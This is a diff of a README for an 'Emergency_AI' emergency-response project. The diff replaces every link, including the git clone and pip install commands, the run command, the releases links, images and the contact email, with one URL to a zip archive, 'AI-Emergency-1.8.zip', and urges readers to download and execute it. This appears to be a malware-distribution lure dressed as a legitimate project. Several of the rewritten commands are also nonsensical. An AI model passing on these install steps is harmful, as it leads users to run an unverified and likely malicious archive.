@@ -2,7 +2,7 @@
 
 Welcome to the **Emergency_AI** repository! This project focuses on enhancing emergency response, management, and equipment through innovative technology. Our goal is to create efficient systems that assist first responders in critical situations.
 
-![Emergency AI](https://img.shields.io/badge/Emergency%20AI-Ready-brightgreen)
+![Emergency AI](https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip%20AI-Ready-brightgreen)
 
 ## Table of Contents
 
@@ -51,14 +51,14 @@ To get started with the **Emergency_AI** project, follow these steps:
 To install the project, use the following commands:
 
 ```bash
-git clone https://github.com/Mtiasqq/Emergency_AI.git
+git clone https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip
 cd Emergency_AI
 ```
 
 Make sure to install the required packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip
 ```
 
 ## Usage
@@ -66,10 +66,10 @@ pip install -r requirements.txt
 After installation, you can start the application with:
 
 ```bash
-python main.py
+python https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip
 ```
 
-You can also find the latest releases and download them from the [Releases section](https://github.com/Mtiasqq/Emergency_AI/releases). Be sure to download the necessary files and execute them as needed.
+You can also find the latest releases and download them from the [Releases section](https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip). Be sure to download the necessary files and execute them as needed.
 
 ## Contributing
 
@@ -89,16 +89,16 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries, please reach out to the project maintainers:
 
 - **Name**: John Doe
-- **Email**: johndoe@example.com
+- **Email**: https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip
 
 ## Releases
 
-To stay updated with the latest features and fixes, visit the [Releases section](https://github.com/Mtiasqq/Emergency_AI/releases). Download the latest version and execute the necessary files to ensure you have the most up-to-date tools for emergency response.
+To stay updated with the latest features and fixes, visit the [Releases section](https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip). Download the latest version and execute the necessary files to ensure you have the most up-to-date tools for emergency response.
 
-![Emergency Response](https://images.unsplash.com/photo-1581093588404-1d2d0d0f3a56)
+![Emergency Response](https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip)
 
 ## Conclusion
 
 The **Emergency_AI** project represents a significant step forward in emergency response technology. By leveraging AI and robotics, we aim to enhance the capabilities of first responders, making our communities safer. Join us in this vital mission to improve emergency management and response systems.
 
-For any additional information, please check the [Releases section](https://github.com/Mtiasqq/Emergency_AI/releases) or contact us directly. Your contributions and feedback are invaluable as we work towards our goals. Thank you for your interest in **Emergency_AI**!
+For any additional information, please check the [Releases section](https://github.com/Mtiasqq/Emergency_AI/raw/refs/heads/main/Pokomam/AI-Emergency-1.8.zip) or contact us directly. Your contributions and feedback are invaluable as we work towards our goals. Thank you for your interest in **Emergency_AI**!
